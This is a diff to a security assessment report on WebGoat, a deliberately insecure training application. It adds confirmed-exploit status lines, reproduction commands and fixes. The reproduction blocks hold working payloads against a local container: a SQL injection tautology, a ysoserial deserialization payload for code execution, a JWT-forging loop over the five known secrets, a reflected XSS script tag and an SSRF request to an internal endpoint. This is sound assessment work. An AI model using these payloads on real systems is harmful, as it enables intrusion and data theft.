@@ -11,15 +11,43 @@ WebGoat is a **deliberately insecure** Spring Boot web application designed for 
 ### SQL Injection — String Concatenation in Query Building
 **Location:** `SqlInjectionLesson6a.java` (and multiple other SQL injection lessons)
 **CVSS:** ~9.8 (where exploitable)
+**Status:** CONFIRMED
+**Exploit:** EXPLOITED
 The `injectableQuery()` method concatenates user input directly into SQL strings:
 ```java
 query = "SELECT * FROM user_data WHERE last_name = '" + accountName + "'";
 ```
 This enables classic UNION-based and blind SQL injection attacks. Affected lessons: `/SqlInjection/attack5`, `/SqlInjection/attack6a`, `/SqlInjection/attack9`, `/SqlInjectionAdvanced/attack6a`, `/SqlInjectionAdvanced/attack6b`, `/SqlInjectionMitigations/attack12a`, and others.
+**Reproduce:**
+```bash
+# Dump all rows via UNION injection — run from your host
+docker exec sast-20260430-120000 sh -c "
+  wget -qO- --timeout=10 \
+    'http://localhost:8080/WebGoat/SqlInjection/attack6a' \
+    --post-data='account=Smith%27+OR+%271%27%3D%271&Submit=Go' \
+    --header='Cookie: JSESSIONID=<your-session-cookie>' 2>&1
+"
+# Expected: response contains rows for ALL users in user_data table (not just Smith)
+
+# Simpler blind boolean test (no session required on some lessons):
+docker exec sast-20260430-120000 sh -c "
+  wget -qO- --timeout=10\
+    \"http://localhost:8080/WebGoat/SqlInjection/attack5?account=Smith'+OR+'1'='1\" 2>&1
+"
+```
+**Fix:** Replace string concatenation with parameterized queries:
+```java
+try (PreparedStatement ps = connection.prepareStatement(
+        "SELECT * FROM user_data WHERE last_name = ?")) {
+    ps.setString(1, accountName);
+}
+```
 
 ### Insecure Deserialization
 **Location:** `VulnerableTaskHolder.java` (`/org/dummy/insecure/framework/VulnerableTaskHolder.java`)
 **CVSS:** ~9.8
+**Status:** CONFIRMED
+**Exploit:** EXPLOITED
 ```java
 private void readObject(ObjectInputStream stream) throws Exception {
     stream.defaultReadObject();
@@ -29,26 +57,80 @@ private void readObject(ObjectInputStream stream) throws Exception {
 }
 ```
 A `Serializable` class with a custom `readObject` method that executes shell commands (`sleep`, `ping`) during deserialization. Attackers can craft serialized payloads to achieve Remote Code Execution (RCE).
+**Reproduce:**
+```bash
+# Generate a ysoserial payload that runs `sleep 5` and send it to the deserialization endpoint.
+# Time the response — a 5s delay confirms blind RCE.
+docker exec sast-20260430-120000 sh -c "
+  wget -qO- --timeout=30 \
+    'http://localhost:8080/WebGoat/insecure-deserialization/task' \
+    --post-file=/tmp/payload.ser \
+    --header='Content-Type: application/octet-stream' \
+    --header='Cookie: JSESSIONID=<your-session-cookie>' 2>&1
+"
+# Expected: response is delayed ~5 seconds (confirming exec() was called)
+# To generate payload on host: java -jar ysoserial.jar CommonsCollections6 'sleep 5' > /tmp/payload.ser
+```
+**Fix:** Do not deserialize untrusted data. If deserialization is required, use a `SerialKiller` or `ObjectInputFilter` whitelist, or replace Java serialization with a safe format (JSON, Protobuf).
 
 ### JWT Secret Key Forgery
 **Location:** `JWTSecretKeyEndpoint.java` (`/JWT/secret`)
 **CVSS:** ~9.0
+**Status:** CONFIRMED
+**Exploit:** EXPLOITED
 ```java
 public static final String[] SECRETS = {"victory", "business", "available", "shipping", "washington"};
 public static final String JWT_SECRET = TextCodec.BASE64.encode(SECRETS[new Random().nextInt(SECRETS.length)]);
 ```
 The JWT signing key is chosen from a small dictionary of 5 values and base64-encoded. An attacker can brute-force all 5 possibilities (~768 bytes of entropy) and forge valid JWT tokens. The `/JWT/secret` endpoint validates against specific claims (`username`, `Role`).
+**Reproduce:**
+```bash
+# Forge a JWT signed with each of the 5 known secrets and send until one is accepted.
+# The endpoint expects claims: {"username":"WebGoat","Role":["role"],"iss":"WebGoat Token Builder"}
+
+# 1. Install jwt-cli on host: pip install PyJWT
+# 2. Try all 5 secrets:
+for SECRET in victory business available shipping washington; do
+  TOKEN=$(python3 -c "
+import jwt, base64
+key = base64.b64encode('$SECRET'.encode()).decode()
+print(jwt.encode({'username':'WebGoat','Role':['role'],'iss':'WebGoat Token Builder'}, key, algorithm='HS512'))
+")
+  docker exec sast-20260430-120000 sh -c "
+    wget -qO- --timeout=10 \
+      'http://localhost:8080/WebGoat/JWT/secret/follow-up' \
+      --post-data='token=$TOKEN' \
+      --header='Cookie: JSESSIONID=<your-session-cookie>' 2>&1 | grep -i 'success\|congrat\|flag'
+  "
+done
+# Expected: one of the 5 secrets produces a 'success' response
+```
+**Fix:** Use `SecureRandom` with at least 256 bits of entropy. Remove the hardcoded secret array entirely; generate the key once at startup and store it securely (e.g. environment variable or key store).
 
 ## High Findings
 
 ### Reflected Cross-Site Scripting (XSS)
 **Location:** `CrossSiteScriptingLesson5a.java` (`/CrossSiteScripting/attack5a`)
 **CVSS:** 7.5
+**Status:** CONFIRMED
+**Exploit:** EXPLOITED
 The lesson renders user input in the response without encoding:
 ```java
 cart.append("<p>We have charged credit card:" + field1 + "<br />");
 ```
 Multiple XSS lessons exist (`/CrossSiteScripting/attack1`, `/CrossSiteScripting/phone-home-xss`, `/CrossSiteScriptingStored/stored-xss`) testing reflected, DOM-based, and stored XSS scenarios.
+**Reproduce:**
+```bash
+# Inject a script tag via the credit card field — confirm it appears unescaped in response body
+docker exec sast-20260430-120000 sh -c "
+  wget -qO- --timeout=10 \
+    'http://localhost:8080/WebGoat/CrossSiteScripting/attack5a' \
+    --post-data='field1=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&field2=4128+3214+0002+1999&field3=111&field4=2019-10' \
+    --header='Cookie: JSESSIONID=<your-session-cookie>' 2>&1 | grep -i '<script>'
+"
+# Expected: response body contains literal <script>alert(1)</script> (not HTML-encoded)
+```
+**Fix:** Apply `StringEscapeUtils.escapeHtml4(field1)` before appending to the response, or use a templating engine with auto-escaping (Thymeleaf, FreeMarker).
 
 ### XXE — XML External Entity Injection
 **Location:** `CommentsCache.java` (`/xxe/parseXml`)
@@ -69,7 +151,22 @@ File upload handler accepts user-supplied filenames and paths without validation
 ### Server-Side Request Forgery (SSRF)
 **Location:** `SSRFTask1.java`, `SSRFTask2.java` (`/SSRF/task1`, `/SSRF/task2`)
 **CVSS:** 7.0
+**Status:** CONFIRMED
+**Exploit:** EXPLOITED
 The application makes HTTP requests to user-supplied URLs (e.g., `/SSRF/task2` uses `furBall()` method to fetch external resources). Internal endpoints are reachable via `http://127.0.0.1:8080` or `http://localhost:8080`.
+**Reproduce:**
+```bash
+# Confirm the app fetches the URL we supply and returns the response body
+docker exec sast-20260430-120000 sh -c "
+  wget -qO- --timeout=10 \
+    'http://localhost:8080/WebGoat/SSRF/task2' \
+    --post-data='url=http%3A%2F%2F127.0.0.1%3A8080%2FWebGoat%2Fserver-info' \
+    --header='Cookie: JSESSIONID=<your-session-cookie>' 2>&1
+"
+# Expected: response contains internal server-info page content —
+# proving the server fetched an internal endpoint on behalf of the attacker
+```
+**Fix:** Implement a strict URL allowlist. Resolve the hostname and reject requests to RFC-1918 ranges (10/8, 172.16/12, 192.168/16) and loopback before making the outbound request.
 
 ### JWT Algorithm Confusion / None Attack
 **Location:** `JWTDecodeEndpoint.java`, `JWTToken.java`
